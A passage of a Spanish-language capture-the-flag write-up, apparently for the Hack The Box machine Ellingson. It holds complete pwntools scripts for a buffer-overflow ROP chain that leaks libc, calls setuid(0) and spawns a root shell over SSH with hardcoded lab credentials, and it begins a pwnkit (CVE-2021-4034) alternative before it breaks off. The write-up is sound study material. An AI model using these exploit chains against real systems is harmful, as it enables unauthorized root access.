+Reading symbols from </span><span class="ve">garbage</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">garbage</span><span class="p">)
+</span><span class="ro">pwndbg> </span><span class="p">cyclic 150
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
+</span><span class="ro">pwndbg> </span><span class="p">run
+Starting program: </span><span class="ve">/home/kali/garbage</span><span class="p">
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+Enter access password: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa  
+
+access denied.
+
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x0000000000401618 </span><span class="p">in </span><span class="am">auth</span><span class="p"> ()
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora podemos buscar el <code class="language-plaintext highlighter-rouge">offset</code>, que es la cantidad de <code class="language-plaintext highlighter-rouge">bytes</code> que podemos enviar antes de que el programa sobreescriba la siguiente instruccion de <code class="language-plaintext highlighter-rouge">retorno</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">x/gx $rsp
+</span><span class="az">0x7fffffffe548</span><span class="p">:  0x6161616161616172
+</span><span class="ro">pwndbg> </span><span class="p">cyclic -l 0x6161616161616172
+</span><span class="sa">Finding cyclic pattern of 8 bytes: b'raaaaaaa' (hex: 0x7261616161616161)
+</span><span class="ve">Found at offset 136
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para lekear una direccion de <code class="language-plaintext highlighter-rouge">libc</code> base necesitaremos algunas cosas, primero la direcion de la funcion <code class="language-plaintext highlighter-rouge">puts@plt</code> del propio binario que podemos ver desde gdb</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">plt
+</span><span class="sa">Section .plt 0x401020-0x401170:  </span><span class="p">
+0x401030: putchar@plt
+0x401040: strcpy@plt
+0x401050: puts@plt
+0x401060: fclose@plt
+0x401070: getpwuid@plt
+0x401080: getuid@plt
+0x401090: printf@plt
+0x4010a0: rewind@plt
+0x4010b0: fgetc@plt
+0x4010c0: read@plt
+0x4010d0: fgets@plt
+0x4010e0: strcmp@plt
+0x4010f0: getchar@plt
+0x401100: gets@plt
+0x401110: syslog@plt
+0x401120: access@plt
+0x401130: fopen@plt
+0x401140: __isoc99_scanf@plt
+0x401150: strcat@plt
+0x401160: exit@plt
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas usaremos la dirección de <code class="language-plaintext highlighter-rouge">got</code> puts que hara referencia a la direccion de puts cargandola desde <code class="language-plaintext highlighter-rouge">libc</code>, la idea es lekear esta direccion para calcular libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">got -r puts
+Filtering by symbol name: </span><span class="am">puts</span><span class="p">
+
+State of the GOT of </span><span class="sa">/home/kali/garbage</span><span class="p">:
+GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1 </span><span class="p">GOT entries passing the filter  
+[</span><span class="sa">0x404028</span><span class="p">] </span><span class="am">puts@GLIBC_2.2.5</span><span class="p"> -> </span><span class="ro">0x7ffff7e38b00 (puts) </span><span class="p">◂— </span><span class="na">push </span><span class="mi">r14
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">ropper</code> vamos a conseguir un gadget que ejecute un <code class="language-plaintext highlighter-rouge">pop rdi</code>, este lo usaremos para guardar en <code class="language-plaintext highlighter-rouge">rdi</code> la direccion de <code class="language-plaintext highlighter-rouge">got</code> para usarlo como argumento</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file garbage --search </span><span class="am">"pop rdi; ret;"  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets for section: LOAD
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: pop rdi; ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: garbage
+</span><span class="ro">0x000000000040179b</span><span class="p">: </span><span class="am">pop </span><span class="p">rdi</span><span class="az">; </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Por ultimo la direccion de <code class="language-plaintext highlighter-rouge">main</code> para que despues de lekear libc con nuestro primer payload vuelva al inicio y podamos enviar un nuevo payload sin dejar de ejecutarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">print main
+$1 = {&lttext variable, no debug info>} </span><span class="az">0x401619 </span><span class="p">&lt</span><span class="am">main</span><span class="p">>
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La primera parte del exploit ejecutara <code class="language-plaintext highlighter-rouge">puts</code> pasandole como argumento la direccion de <code class="language-plaintext highlighter-rouge">got</code> por lo que se nos mostrara la direccion de puts cargado desde <code class="language-plaintext highlighter-rouge">libc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">ssh, p64
+
+session </span><span class="o">= </span><span class="p">ssh(host</span><span class="o">=</span><span class="s">"ellingson.htb"</span><span class="p">, user</span><span class="o">=</span><span class="s">"margo"</span><span class="p">, password</span><span class="o">=</span><span class="s">"iamgod$08"</span><span class="p">)  
+shell </span><span class="o">= </span><span class="p">session.process(</span><span class="s">"/usr/bin/garbage"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">136</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+plt_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401050</span><span class="p">)
+got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404028</span><span class="p">)
+pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40179b</span><span class="p">)
+main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401619</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
+payload </span><span class="o">+= </span><span class="p">plt_puts
+payload </span><span class="o">+= </span><span class="p">main
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+</span><span class="no">print</span><span class="p">(shell.recvline())</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo explota el buffer overflow remotamente y al interpretar nuestro payload conseguimos lekear la direccion de la funcion <code class="language-plaintext highlighter-rouge">puts</code> cargada desde <code class="language-plaintext highlighter-rouge">libc</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Connecting to ellingson.htb on port 22: Done
+[</span><span class="az">*</span><span class="p">] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     </span><span class="ve">Enabled</span><span class="p">
+[</span><span class="ve">+</span><span class="p">] Starting remote process bytearray(b'/usr/bin/garbage') on ellingson.htb: pid 4202  
+b'\xc09~\x9e\x01\x7f\n'</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para representarlo en un entero como necesitamos podemos usar <code class="language-plaintext highlighter-rouge">u64</code> de pwntools</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">ssh, p64, u64, log
+
+session </span><span class="o">= </span><span class="p">ssh(host</span><span class="o">=</span><span class="s">"ellingson.htb"</span><span class="p">, user</span><span class="o">=</span><span class="s">"margo"</span><span class="p">, password</span><span class="o">=</span><span class="s">"iamgod$08"</span><span class="p">)  
+shell </span><span class="o">= </span><span class="p">session.process(</span><span class="s">"/usr/bin/garbage"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">136</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+plt_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401050</span><span class="p">)
+got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404028</span><span class="p">)
+pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40179b</span><span class="p">)
+main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401619</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
+payload </span><span class="o">+= </span><span class="p">plt_puts
+payload </span><span class="o">+= </span><span class="p">main
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip().ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))
+log.info(</span><span class="no">f</span><span class="s">"Leaked puts: </span><span class="p">{</span><span class="no">hex</span><span class="p">(leak_puts)}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo podemos ver la direccion lekeada en un mejor formato que es el <code class="language-plaintext highlighter-rouge">hex</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Connecting to ellingson.htb on port 22: Done
+[</span><span class="az">*</span><span class="p">] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     </span><span class="ve">Enabled</span><span class="p">
+[</span><span class="ve">+</span><span class="p">] Starting remote process bytearray(b'/usr/bin/garbage') on ellingson.htb: pid 4109  
+[</span><span class="az">*</span><span class="p">] Leaked puts: 0x7f6eacc229c0</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lekeamos la direccion de puts cargado desde <code class="language-plaintext highlighter-rouge">libc</code> por lo que si le restamos el offset de <code class="language-plaintext highlighter-rouge">puts</code> que vemos con <code class="language-plaintext highlighter-rouge">libcdb</code> lo que conseguimos es la direccion base de libc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb </span><span class="p">file libc.so.6
+[</span><span class="az">*</span><span class="p">] </span><span class="ro">libc.so.6
+    </span><span class="ve">Version:     </span><span class="p">2.27
+    </span><span class="ve">BuildID:     </span><span class="p">b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0
+    </span><span class="ve">MD5:         </span><span class="p">50390b2ae8aaa73c47745040f54e602f
+    </span><span class="ve">SHA1:        </span><span class="p">18292bd12d37bfaf58e8dded9db7f1f5da1192cb
+    </span><span class="ve">SHA256:      </span><span class="p">cd7c1a035d24122798d97a47a10f6e2b71d58710aecfd392375f1aa9bdde164d  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x21b97
+                         dup2 = 0x1109a0
+                       printf = 0x64e80
+                         puts = 0x809c0
+                         read = 0x110070
+                   str_bin_sh = 0x1b3e9a
+                       system = 0x4f440
+                        write = 0x110140</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez calculamos la direccion base de libc podemos sumarle los offsets de <code class="language-plaintext highlighter-rouge">system</code> y de <code class="language-plaintext highlighter-rouge">/bin/sh</code> para obtener las direcciones que necesitamos para una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x809c0</span><span class="p">
+
+system </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x4f440</span><span class="p">)
+bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x1b3e9a</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Despues de lekear libc enviamos un nuevo payload que guardara en <code class="language-plaintext highlighter-rouge">rdi</code> la direccion de la string <code class="language-plaintext highlighter-rouge">/bin/sh</code> para posteriormente llamar a <code class="language-plaintext highlighter-rouge">system</code> y conseguir una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">ssh, p64, u64
+
+session </span><span class="o">= </span><span class="p">ssh(host</span><span class="o">=</span><span class="s">"ellingson.htb"</span><span class="p">, user</span><span class="o">=</span><span class="s">"margo"</span><span class="p">, password</span><span class="o">=</span><span class="s">"iamgod$08"</span><span class="p">)  
+shell </span><span class="o">= </span><span class="p">session.process(</span><span class="s">"/usr/bin/garbage"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">136</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+plt_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401050</span><span class="p">)
+got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404028</span><span class="p">)
+pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40179b</span><span class="p">)
+main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401619</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
+payload </span><span class="o">+= </span><span class="p">plt_puts
+payload </span><span class="o">+= </span><span class="p">main
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip().ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))
+libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x809c0</span><span class="p">
+
+system </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x4f440</span><span class="p">)
+bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x1b3e9a</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
+payload </span><span class="o">+= </span><span class="p">system
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al ejecutar el exploit no conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como se esperaba sino que el programa se detiene muy probablemente por un error de instruccion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Connecting to ellingson.htb on port 22: Done
+[</span><span class="az">*</span><span class="p">] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     </span><span class="ve">Enabled</span><span class="p">
+[</span><span class="ve">+</span><span class="p">] Starting remote process bytearray(b'/usr/bin/garbage') on ellingson.htb: pid 4717  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+[</span><span class="az">*</span><span class="p">] Got EOF while reading in interactive
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para ver que esta pasando podemos usar <code class="language-plaintext highlighter-rouge">gdb</code> para ver donde se detiene el progama</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shell </span><span class="o">= </span><span class="p">gdb.debug(</span><span class="s">"./garbage"</span><span class="p">, gdbscript</span><span class="o">=</span><span class="s">"continue"</span><span class="p">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Una vez ejecutamos el exploit podemos ver que se corrompe al ejecutar un <code class="language-plaintext highlighter-rouge">movaps</code>, esto se debe a que las funciones de libc en <code class="language-plaintext highlighter-rouge">x64</code> requieren que la pila este alineada en <code class="language-plaintext highlighter-rouge">16</code> bytes, osea que la direccion de <code class="language-plaintext highlighter-rouge">RSP</code> termine en <code class="language-plaintext highlighter-rouge">0</code> que en este caso no es asi</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.
+</span><span class="az">0x00007f9674c4f2f6 </span><span class="p">in </span><span class="am">??</span><span class="p"> () from </span><span class="ve">./libc.so.6
+</span><span class="ro">pwndbg> </span><span class="p">context disasm
+LEGEND: </span><span class="am">STACK</span><span class="p"> | </span><span class="az">HEAP</span><span class="p"> | </span><span class="ro">CODE</span><span class="p"> | </span><span class="sa">DATA</span><span class="p"> | RWX | RODATA
+</span><span class="az">───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
+</span><span class="ve"> ► 0x7f9674c4f2f6    </span><span class="na">movaps </span><span class="no">xmmword ptr </span><span class="p">[</span><span class="no">rsp </span><span class="p">+ </span><span class="mi">0x40</span><span class="p">], </span><span class="no">xmm0</span><span class="p">
+   0x7f9674c4f2fb    </span><span class="na">call   </span><span class="mi">sigaction</span><span class="p">                &lt</span><span class="ro">sigaction</span><span class="p">>
+ 
+   0x7f9674c4f300    </span><span class="na">lea    </span><span class="no">rsi</span><span class="p">, [</span><span class="no">rip </span><span class="p">+ </span><span class="mi">0x39e2f9</span><span class="p">]
+   0x7f9674c4f307    </span><span class="na">xor    </span><span class="no">edx</span><span class="p">, </span><span class="no">edx</span><span class="p">
+   0x7f9674c4f309    </span><span class="na">mov    </span><span class="no">edi</span><span class="p">, </span><span class="mi">3</span><span class="p">
+   0x7f9674c4f30e    </span><span class="na">call   </span><span class="mi">sigaction</span><span class="p">                &lt</span><span class="ro">sigaction</span><span class="p">>
+ 
+   0x7f9674c4f313    </span><span class="na">xor    </span><span class="no">edx</span><span class="p">, </span><span class="no">edx</span><span class="p">
+   0x7f9674c4f315    </span><span class="na">mov    </span><span class="no">rsi</span><span class="p">, </span><span class="no">rbp</span><span class="p">
+   0x7f9674c4f318    </span><span class="na">mov    </span><span class="no">edi</span><span class="p">, </span><span class="mi">2</span><span class="p">
+   0x7f9674c4f31d    </span><span class="na">call   </span><span class="mi">sigprocmask</span><span class="p">                &lt</span><span class="ro">sigprocmask</span><span class="p">>
+</span><span class="az">──────────────────────────────────────────────────────────────────────────────────  
+</span><span class="ro">pwndbg> </span><span class="p">regs rsp
+ RSP  </span><span class="am">0x7fff39bee1f8</span><span class="p"> —▸ 0x402181 ◂— 'access denied.'
+</span><span class="ro">pwndbg> </code>
+</code></pre></div></div><br>
+
+<p class="plain-text">La solución es sencilla y es que solo necesitamos un gadget para ejecutar un <code class="language-plaintext highlighter-rouge">ret</code>, al hacerlo este alineara la pila por lo que la funcion deberia ejecutarse sin problemas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file garbage --search </span><span class="am">"ret;"  
+</span><span class="ve">[INFO] </span><span class="p">Load gadgets from cache
+</span><span class="ve">[LOAD] </span><span class="p">loading... 100%
+</span><span class="ve">[LOAD] </span><span class="p">removing double gadgets... 100%
+</span><span class="ve">[INFO] </span><span class="p">Searching for gadgets: ret;
+
+</span><span class="ve">[INFO] </span><span class="p">File: garbage
+</span><span class="ro">0x0000000000401016</span><span class="p">: </span><span class="am">ret</span><span class="az">;</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Definimos la direccion de <code class="language-plaintext highlighter-rouge">ret</code> que enviaremos justo antes de llamar a <code class="language-plaintext highlighter-rouge">system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ret </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401016</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
+payload </span><span class="o">+= </span><span class="p">ret
+payload </span><span class="o">+= </span><span class="p">system</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit conseguimos una shell sin embargo seguimos como el usuario <code class="language-plaintext highlighter-rouge">margo</code>, es porque aunque el programa es suid en ningun momento ejecuta <code class="language-plaintext highlighter-rouge">setuid</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Connecting to ellingson.htb on port 22: Done
+[</span><span class="az">*</span><span class="p">] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     </span><span class="ve">Enabled</span><span class="p">
+[</span><span class="ve">+</span><span class="p">] Starting remote process bytearray(b'/usr/bin/garbage') on ellingson.htb: pid 4813  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+$ </span><span class="ro">$ </span><span class="p">id
+uid=1002(margo) gid=1002(margo) groups=1002(margo)
+$ </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El offset de la funcion <code class="language-plaintext highlighter-rouge">setuid</code> podemos conseguirla con readelf y el archivo libc.so.6</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ readelf </span><span class="p">-s libc.so.6 | </span><span class="ve">grep </span><span class="p">setuid  
+    23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 </span><span class="ro">setuid</span><span class="p">@@GLIBC_2.2.5  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro exploit final se divide en 3 etapas, la primera se encarga de lekear la direccion base de <code class="language-plaintext highlighter-rouge">libc</code>, la segunda se encarga de ejecutar un <code class="language-plaintext highlighter-rouge">setuid(0)</code> y la ultima ejecuta un <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> que nos otorga una shell con el uid 0 que es el de <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">ssh, p64, u64
+
+session </span><span class="o">= </span><span class="p">ssh(host</span><span class="o">=</span><span class="s">"ellingson.htb"</span><span class="p">, user</span><span class="o">=</span><span class="s">"margo"</span><span class="p">, password</span><span class="o">=</span><span class="s">"iamgod$08"</span><span class="p">)  
+shell </span><span class="o">= </span><span class="p">session.process(</span><span class="s">"/usr/bin/garbage"</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">136</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+plt_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401050</span><span class="p">)
+got_puts </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x404028</span><span class="p">)
+pop_rdi </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x40179b</span><span class="p">)
+main </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401619</span><span class="p">)
+ret </span><span class="o">= </span><span class="p">p64(</span><span class="mi">0x401016</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">got_puts
+payload </span><span class="o">+= </span><span class="p">plt_puts
+payload </span><span class="o">+= </span><span class="p">main
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+leak_puts </span><span class="o">= </span><span class="p">u64(shell.recvline().strip().ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">))
+libc_base </span><span class="o">= </span><span class="p">leak_puts </span><span class="o">- </span><span class="mi">0x809c0</span><span class="p">
+
+setuid </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0xe5970</span><span class="p">)
+system </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x4f440</span><span class="p">)
+bin_sh </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="mi">0x1b3e9a</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">0</span><span class="p">)
+payload </span><span class="o">+= </span><span class="p">setuid
+payload </span><span class="o">+= </span><span class="p">main
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">bin_sh
+payload </span><span class="o">+= </span><span class="p">ret
+payload </span><span class="o">+= </span><span class="p">system
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"password: "</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"access denied.</span><span class="mi">\n</span><span class="s">"</span><span class="p">)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo se conecta a <code class="language-plaintext highlighter-rouge">ssh</code> como margo donde ejecuta el binario y al explotar el buffer overflow con el payload anterior conseguimos una <code class="language-plaintext highlighter-rouge">shell</code> como root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Connecting to ellingson.htb on port 22: Done
+[</span><span class="az">*</span><span class="p">] margo@ellingson.htb:
+    Distro    Ubuntu 18.04
+    OS:       linux
+    Arch:     amd64
+    Version:  4.15.0
+    ASLR:     </span><span class="ve">Enabled</span><span class="p">
+[</span><span class="ve">+</span><span class="p">] Starting remote process bytearray(b'/usr/bin/garbage') on ellingson.htb: pid 5512  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+# </span><span class="ro">$ </span><span class="p">whoami
+root
+# </span><span class="ro">$ </span><span class="p">hostname -I
+10.10.10.139
+# </span><span class="ro">$ </span><span class="p">cat /root/root.txt
+424**************************ddf
+# </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="extra1-root">
+<br><h3 class="post-title">Extra 1 - root</h3><br>
+
+<p class="plain-text">Como alternativa cuando buscamos por binarios con privilegios <code class="language-plaintext highlighter-rouge">suid</code> vemos el ya famoso <code class="language-plaintext highlighter-rouge">pkexec</code>, con un exploit del <a href="https://github.com/joeammond/CVE-2021-4034/">pwnkit</a> nos podemos convertir en root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">hal@ellingson</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l /usr/bin/pkexec 
